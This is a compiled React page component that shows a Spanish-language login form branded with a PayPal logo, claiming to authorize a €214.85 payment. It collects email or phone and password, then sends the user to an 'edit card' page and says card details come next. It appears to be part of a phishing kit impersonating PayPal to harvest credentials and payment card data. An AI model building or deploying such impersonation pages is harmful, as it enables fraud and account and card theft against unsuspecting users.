import { N as reactExports, G as jsxRuntimeExports } from "./server-DUxKx5xb.js";
import { u as useNavigate } from "./router-D80unHli.js";
import { P as PhoneShell } from "./PhoneShell-CtxupxdS.js";
import { P as PayPalLogo } from "./PayPalLogo-CVgvf5v7.js";
import "node:async_hooks";
import "node:stream/web";
import "node:stream";
function PayPalPage() {
  const navigate = useNavigate();
  const [email, setEmail] = reactExports.useState("");
  const [password, setPassword] = reactExports.useState("");
  const onSubmit = (e) => {
    e.preventDefault();
    navigate({
      to: "/editar-tarjeta"
    });
  };
  return /* @__PURE__ */ jsxRuntimeExports.jsxs(PhoneShell, { showHelp: false, children: [
    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex justify-center mt-4 mb-6", children: /* @__PURE__ */ jsxRuntimeExports.jsx(PayPalLogo, { className: "h-10" }) }),
    /* @__PURE__ */ jsxRuntimeExports.jsxs("p", { className: "text-center text-sm text-gray-600 mb-6", children: [
      "Inicia sesión para autorizar el pago de ",
      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "font-semibold", children: "214,85 €" })
    ] }),
    /* @__PURE__ */ jsxRuntimeExports.jsxs("form", { onSubmit, className: "space-y-4", children: [
      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
        /* @__PURE__ */ jsxRuntimeExports.jsx("label", { className: "text-xs text-gray-600", children: "Correo o número de móvil" }),
        /* @__PURE__ */ jsxRuntimeExports.jsx("input", { type: "text", required: true, value: email, onChange: (e) => setEmail(e.target.value), className: "mt-1 w-full border border-gray-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#0070E0]" })
      ] }),
      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
        /* @__PURE__ */ jsxRuntimeExports.jsx("label", { className: "text-xs text-gray-600", children: "Contraseña" }),
        /* @__PURE__ */ jsxRuntimeExports.jsx("input", { type: "password", required: true, value: password, onChange: (e) => setPassword(e.target.value), className: "mt-1 w-full border border-gray-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#0070E0]" })
      ] }),
      /* @__PURE__ */ jsxRuntimeExports.jsx("button", { type: "submit", className: "w-full py-3.5 rounded-full bg-[#0070E0] hover:bg-[#003087] transition text-white font-semibold text-sm", children: "Iniciar sesión" }),
      /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-center text-xs text-gray-500", children: "Tras confirmar, te pediremos los datos de tu tarjeta para finalizar." })
    ] })
  ] });
}
export {
  PayPalPage as component
};
